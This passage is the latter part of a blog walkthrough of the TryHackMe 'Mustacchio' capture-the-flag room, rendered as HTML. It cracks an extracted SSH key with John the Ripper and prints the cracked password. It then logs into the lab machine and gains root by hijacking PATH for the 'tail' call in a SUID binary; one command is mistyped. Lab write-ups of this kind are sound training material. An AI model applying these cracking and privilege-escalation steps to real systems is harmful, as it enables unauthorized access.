&lt;com&gt;&amp;example;&lt;/com&gt;
&lt;/comment&gt;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/outrsa.png" alt="outrsa"></p>

<p>Yes, we have reached the RSA key, now we need to copy and edit this key. I tried without editing and it doesn’t work :D.
Make sure there are no spaces at the end of the lines. Each one should be a separate line.
It should look like this when you edit it.</p>

<p><img src="/assets/img/tryhackme/mustacchio/edit.png" alt="edit"></p>

<p>Now we need to crack this id_rsa for barry’s ssh password.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh2john id_rsa &gt; id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/crack.png" alt="crack"></p>

<p><strong><code class="language-plaintext highlighter-rouge">barry : urieljames</code></strong></p>

<p>Now we can log in ssh.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 id_rsa
$ ssh -i id_rsa barry@10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/barryin.png" alt="barryin"></p>

<p>And we are inside.</p>

<p>Now we can access the user flag.</p>

<p><img src="/assets/img/tryhackme/mustacchio/user-flag.png" alt="user-flag"></p>

<p><br></p>

<h3 id="12-root-flag">1.2 Root Flag?</h3>

<p><em>Hint: SUID?</em></p>

<p>We proceed with the clue that the question gives us. First, we will run the following code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/suid.png" alt="suid"></p>

<p>I couldn’t find anything remarkable and started navigating the system.</p>

<p>I discovered the joe directory next to barry, and if you remember a file like <code class="language-plaintext highlighter-rouge">live_log</code> in it, we also saw this file as a result of the code we wrote above.</p>

<p><img src="/assets/img/tryhackme/mustacchio/ls.png" alt="ls"></p>

<p>I’m looking at the strings content of this log file and we find something remarkable here. The tail command was used.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$strings live_log
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/strings.png" alt="strings"></p>

<p>I’ve been doing some research on how to escalate using this and I find that it’s as follows.</p>

<p><img src="/assets/img/tryhackme/mustacchio/privesc.png" alt="privesc"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "/bin/sh" &gt; tail
$ chmod 777 tail
$ export PATH=/tmp.$PATH
$ cd /home/joe/
$ ./live_log
</code></pre></div></div>

<p>And we are inside. To be frank, I don’t fully understand the logic of raising authority, I’ll go over it a little later.
But now we can get to root.txt.</p>

<p><img src="/assets/img/tryhackme/mustacchio/root-flag.png" alt="root-flag"></p>

<p><br></p>

<hr>

<p><br></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 19, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">xxe,</span>
          
          <span class="post__tags-item">privesc,</span>
          
          <span class="post__tags-item">enumeraton</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-mustacchio/';
    this.page.identifier = '/tryhackme-mustacchio';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
    </div>




    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
    <footer>
  <div class="footer">
    © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
  </div>
</footer>

    <!-- script -->
    <script src="/assets/js/nav.js"></script>
    <script src="/assets/js/clip.js"></script>
    <script src="/assets/js/scroll-top.js"></script>
    <script src="/assets/js/search.js"></script>
    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "TryHackMe - Mustacchio",
    "author": {
      "@type": "Person",
      "name": ""
    },
    "datePublished": "2023-03-19 00:00:00 +0300",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http://localhost:4000/tryhackme-mustacchio/"
    },
    "articleSection": "TryHackMe"
  }
</script>
  </body>
</html>
